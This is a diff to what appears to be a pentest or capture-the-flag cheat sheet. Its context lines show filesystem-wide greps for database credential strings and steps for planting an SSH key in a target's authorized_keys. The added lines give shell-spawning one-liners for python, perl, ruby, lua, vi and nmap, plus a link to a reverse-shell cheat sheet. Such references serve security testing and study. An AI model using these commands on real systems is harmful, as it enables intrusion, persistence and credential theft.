@@ -51,9 +51,30 @@ grep -rnw '/' -ie 'DB_PASS' --color=always
 grep -rnw '/' -ie 'DB_PASSWORD' --color=always
 grep -rnw '/' -ie 'DB_USER' --color=always
 
-[Generating Public Keys and Xfering to your target]
+### [Generating Public Keys and Xfering to your target]
 ```
 1. ssh-keygen to create your paired keys (private + public)
 2. cat your key.pub and copy and paste the public key data over to the host's authorized keys in /home/username/.ssh/authorized_keys
 3. ssh into the box using your private key ssh -i privatekey username@IP
 ```
+
+### [tty shell]
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+echo os.system('/bin/bash')
+/bin/sh -i
+perl —e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+ruby: exec "/bin/sh"
+lua: os.execute('/bin/sh')
+(From within IRB)
+exec "/bin/sh"
+(From within vi)
+:!bash
+(From within vi)
+:set shell=/bin/bash:shell
+(From within nmap)
+!sh
+```
+reverse TCP Shell's
+http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
